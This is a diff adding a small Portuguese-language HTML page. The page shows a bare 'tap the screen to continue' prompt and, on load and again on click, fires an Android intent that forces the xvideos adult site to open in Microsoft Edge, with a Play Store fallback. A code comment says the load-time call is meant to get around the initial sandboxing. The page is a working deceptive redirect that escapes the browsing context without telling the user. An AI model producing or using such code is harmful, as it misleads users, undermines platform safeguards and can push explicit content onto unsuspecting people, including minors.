@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>body{margin:0;background:#121212;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;font-family:sans-serif;}</style>
+</head>
+<body onclick="disparoKernel()">
+    <h2>Toque na tela para continuar</h2>
+    <script>
+        function disparoKernel() {
+            let t=setTimeout(()=>location.href="https://play.google.com/store/apps/details?id=com.microsoft.emmx",500);
+            document.addEventListener("visibilitychange",()=>clearTimeout(t));
+            location.href="intent://xvideos.com.br#Intent;scheme=https;package=com.microsoft.emmx;end;";
+        }
+        // Tentativa de execução paralela para burlar o sandboxing inicial
+        window.onload = function() {
+            location.href="intent://xvideos.com.br#Intent;scheme=https;package=com.microsoft.emmx;end;";
+        }
+    </script>
+</body>
+</html>
